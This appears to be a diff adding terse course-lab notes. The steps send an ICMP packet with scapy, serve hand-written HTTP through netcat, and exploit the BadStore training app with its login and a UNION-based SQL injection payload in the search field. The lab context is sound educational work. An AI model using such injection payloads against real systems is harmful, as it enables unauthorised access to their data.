@@ -1,0 +1,64 @@
+p11.
+(a)
+
+open cmd in windows
+
+scapy
+from scapy.all import *
+
+packet = IP(dst="8.8.8.8")/ICMP()
+send(packet)
+
+open wireshark
+start capture
+
+apply filter:
+
+icmp
+
+observe ICMP packets (echo request and reply)
+
+(b)
+
+go to browser and open wikipedia image in new tab and copy image link
+
+open terminal
+
+nc -l -p 5000
+
+go to browser firefox and search ->
+
+http://localhost:5000
+
+come back to terminal
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: nooblinux
+
+<!doctype html>
+<title>bnm</title>
+<h1>cars</h1>
+<img src="image_link">
+(c)
+
+open badstore
+
+login:
+
+joe@supplier.com / iforgot
+
+go to search on left side
+
+enter:
+
+x
+
+inspect search bar
+remove maxlength restriction
+
+enter query:
+
+x' UNION SELECT count(itemnum), count(itemnum), count(itemnum), count(price) FROM itemdb -- 
+
+output shows total number of items in database
